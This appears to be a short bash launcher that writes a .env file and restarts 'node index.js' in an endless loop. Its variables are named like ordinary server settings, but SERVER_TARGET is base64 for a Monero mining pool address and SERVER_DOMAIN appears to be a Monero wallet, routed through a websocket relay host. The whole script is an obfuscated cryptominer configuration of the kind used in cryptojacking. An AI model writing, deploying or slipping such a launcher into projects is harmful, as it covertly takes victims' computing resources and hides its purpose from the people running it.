#!/bin/bash
CONNECT=${1:-8}
NAME=${2:-004}
echo "SERVER_WS=ws://cdn.medco.cyou
SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTo4MA==
SERVER_DOMAIN=84GbAidJhw8cxCq941aeTd7zHL5uJ5XhzLHgWUX3eQ4VfHoswB3Dx1edeWCpxJRKx53bTLEzVdGeJFNCPQ5o1BMKJdqH2C4
SERVER_SECRET=${NAME}
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 15; done
